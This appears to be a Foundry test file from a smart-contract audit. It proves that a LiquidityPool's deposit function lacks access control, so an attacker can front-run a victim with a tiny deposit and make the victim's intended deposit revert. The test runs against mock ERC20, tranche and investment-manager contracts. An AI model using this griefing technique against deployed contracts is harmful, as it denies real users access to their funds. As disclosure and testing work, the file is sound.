// SPDX-License-Identifier: MIT
pragma solidity 0.8.21;

import "forge-std/Test.sol";

// Import the contract under test
import {LiquidityPool} from "src/LiquidityPool.sol";
import {IERC20} from "src/interfaces/IERC20.sol";
import {InvestmentManagerLike} from "src/LiquidityPool.sol";
import {TrancheTokenLike} from "src/LiquidityPool.sol";

/**
 * @title ExploitTest
 * @notice PoC demonstrating that anyone can call LiquidityPool.deposit / mint on behalf of another
 *         user because the functions lack proper access-control (neither msg.sender == receiver nor
 *         allowance checks are enforced).  This enables a grief / DoS attack where an attacker first
 *         executes a tiny deposit for the victim, partially consuming the victim’s quota.  When the
 *         victim later tries to perform their intended, larger deposit the transaction reverts.
 */
contract ExploitTest is Test {
    address attacker = address(0xA11CE);
    address victim   = address(0xB0B);

    SimpleERC20  asset;
    MockTranche  share;
    MockInvestmentManager manager;
    LiquidityPool pool;

    function setUp() public {
        // Deploy mocks
        asset   = new SimpleERC20("AssetToken", "AST", 18);
        share   = new MockTranche("ShareToken", "SHR", 18);
        manager = new MockInvestmentManager();

        // Deploy the LiquidityPool with mock dependencies
        pool = new LiquidityPool({
            poolId_: 1,
            trancheId_: bytes16(0),
            asset_: address(asset),
            share_: address(share),
            investmentManager_: address(manager)
        });

        // For the purpose of the PoC we directly set up the InvestmentManager order-book so that
        // the victim can deposit at most 100 units in total after an epoch execution.
        manager.setMaxDeposit(victim, address(pool), 100);

        // Fund attacker & victim with a little ether so that they can send transactions.
        vm.deal(attacker, 1 ether);
        vm.deal(victim, 1 ether);
    }

    /**
     * @notice Demonstrates the griefing / DoS vector.
     *         1. Attacker calls `pool.deposit(1, victim)`, front-running the victim.  This succeeds
     *            even though the attacker never had approval from the victim.
     *         2. Victim later tries to deposit their full intended 100 units but the call now
     *            reverts as their remaining limit is only 99 units.  The victim is DoSed.
     */
    function test_DoSByUnauthorizedDeposit() public {
        // ------------- Phase 1 : Attacker frontruns -------------
        vm.prank(attacker);
        pool.deposit(1, victim); // succeeds – no access control

        // The attacker has reduced victim's remaining maxDeposit from 100 -> 99
        assertEq(manager.maxDeposit(victim, address(pool)), 99, "remaining quota incorrect");

        // ------------- Phase 2 : Victim transaction reverts -------------
        vm.prank(victim);
        vm.expectRevert(); // Any revert is sufficient to prove DoS
        pool.deposit(100, victim); // exceeds remaining limit, hence reverts
    }
}

/* -------------------------------------------------------------------------- */
/*                                 Mock contracts                             */
/* -------------------------------------------------------------------------- */

/// @dev Minimal ERC20 implementation sufficient for the PoC
contract SimpleERC20 is IERC20 { // NOTE: simplified test implementation, fulfils the interface
    string public name;
    string public symbol;
    uint8  public immutable decimals;

    uint256 public override totalSupply;
    mapping(address => uint256) public override balanceOf;
    mapping(address => mapping(address => uint256)) public override allowance;

    constructor(string memory _n, string memory _s, uint8 _d) {
        name = _n;
        symbol = _s;
        decimals = _d;
    }

    function transfer(address to, uint256 amount) public override returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) public override returns (bool) {
        uint256 current = allowance[from][msg.sender];
        require(current >= amount, "ERC20/insufficient-allowance");
        if (current != type(uint256).max) allowance[from][msg.sender] = current - amount;
        _transfer(from, to, amount);
        return true;
    }

    function _transfer(address from, address to, uint256 amount) internal {
        require(balanceOf[from] >= amount, "ERC20/insufficient-balance");
        balanceOf[from] -= amount;
        balanceOf[to]   += amount;
        emit Transfer(from, to, amount);
    }

    // Mint helper for tests
    function mint(address to, uint256 amount) external override {
        balanceOf[to] += amount;
        totalSupply   += amount;
        emit Transfer(address(0), to, amount);
    }

    function burn(address from, uint256 amount) external override {
        require(balanceOf[from] >= amount, "ERC20/insufficient-balance");
        balanceOf[from] -= amount;
        totalSupply     -= amount;
        emit Transfer(from, address(0), amount);
    }
}

/// @dev Mock tranche token implementing the functions LiquidityPool interacts with
contract MockTranche is SimpleERC20, TrancheTokenLike { // also implements IERC20 so functions already covered
    bytes32 public constant PERMIT_TYPEHASH = keccak256("Mock");
    bytes32 public constant DOMAIN_SEPARATOR = keccak256("Mock");

    constructor(string memory n, string memory s, uint8 d) SimpleERC20(n, s, d) {}

    /* -------------------- TrancheTokenLike specific -------------------- */
    function permit(
        address /*owner*/,
        address /*spender*/,
        uint256 /*value*/,
        uint256 /*deadline*/,
        uint8 /*v*/,
        bytes32 /*r*/,
        bytes32 /*s*/
    ) external override {}

    function checkTransferRestriction(
        address /*from*/,
        address /*to*/,
        uint256 /*value*/
    ) external pure override returns (bool) {
        return true; // no restriction in the mock
    }
}

/// @dev Minimal mock InvestmentManager that only tracks maxDeposit logic relevant for the PoC
contract MockInvestmentManager is InvestmentManagerLike {
    struct Values { uint256 maxDeposit; }
    mapping(address => mapping(address => Values)) private _orderbook; // user => pool => values

    // --- helpers (non-interface) ---
    function setMaxDeposit(address user, address pool, uint256 amount) external {
        _orderbook[user][pool].maxDeposit = amount;
    }

    // --- interface impl ---
    function processDeposit(address receiver, uint256 assets) external override returns (uint256) {
        Values storage v = _orderbook[receiver][msg.sender];
        require(assets != 0 && assets <= v.maxDeposit, "MockIM/amount-exceeds-deposit-limits");
        v.maxDeposit -= assets;
        return assets; // 1:1 share payout
    }

    function maxDeposit(address user, address pool) external view override returns (uint256) {
        return _orderbook[user][pool].maxDeposit;
    }

    /* ---------------- Unused functions – dummy implementations ---------------- */
    function processMint(address receiver, uint256 shares) external pure override returns (uint256) { receiver; shares; return 0; }
    function processWithdraw(uint256 assets, address receiver, address owner) external pure override returns (uint256) { assets; receiver; owner; return 0; }
    function processRedeem(uint256 shares, address receiver, address owner) external pure override returns (uint256) { shares; receiver; owner; return 0; }
    function maxMint(address, address) external pure override returns (uint256) { return 0; }
    function maxWithdraw(address, address) external pure override returns (uint256) { return 0; }
    function maxRedeem(address, address) external pure override returns (uint256) { return 0; }
    function totalAssets(uint256, address) external pure override returns (uint256) { return 0; }
    function convertToShares(uint256, address) external pure override returns (uint256) { return 0; }
    function convertToAssets(uint256, address) external pure override returns (uint256) { return 0; }
    function previewDeposit(address, address, uint256) external pure override returns (uint256) { return 0; }
    function previewMint(address, address, uint256) external pure override returns (uint256) { return 0; }
    function previewWithdraw(address, address, uint256) external pure override returns (uint256) { return 0; }
    function previewRedeem(address, address, uint256) external pure override returns (uint256) { return 0; }
    function requestRedeem(uint256, address) external pure override {}
    function requestDeposit(uint256, address) external pure override {}
    function collectDeposit(address) external pure override {}
    function collectRedeem(address) external pure override {}
    function decreaseDepositRequest(uint256, address) external pure override {}
    function decreaseRedeemRequest(uint256, address) external pure override {}
}
